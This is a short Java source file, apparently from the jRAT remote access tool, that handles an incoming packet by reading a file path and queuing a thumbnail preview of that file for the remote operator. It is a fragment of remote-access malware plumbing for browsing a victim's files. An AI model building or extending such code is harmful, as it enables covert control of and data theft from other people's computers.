package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;


public class Packet85ThumbnailPreview implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();

		con.addToSendQueue(new Packet59ThumbnailPreview(file));
	}

}
